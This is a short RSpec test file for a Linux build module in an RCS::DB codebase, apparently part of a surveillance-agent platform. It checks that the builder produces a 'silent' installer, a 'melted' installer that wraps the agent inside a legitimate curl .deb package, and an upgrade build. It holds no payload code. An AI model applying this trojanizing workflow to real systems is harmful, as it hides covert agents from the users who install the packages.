require 'spec_helper'
require 'fileutils'

require_db 'db_layer'
require_db 'grid'
require_db 'build'
require_db 'core'
require_db 'alert'

require_relative 'shared'

module RCS::DB
  describe BuildLinux, build: true do

    shared_spec_for(:linux, melt: 'curl_7.32.0-1ubuntu1_i386.deb')

    describe 'linux builder' do
      it 'should create the silent installer' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {}
        }

        subject.create(params)

        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end

      it 'should create the melted installer' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {'input' => melt_file}
        }

        subject.create(params)

        expect(File.size(subject.path(subject.outputs.first))).not_to eql(0)
      end

      it 'should create the ugrade build' do
        @agent.upgrade!
      end
    end
  end
end
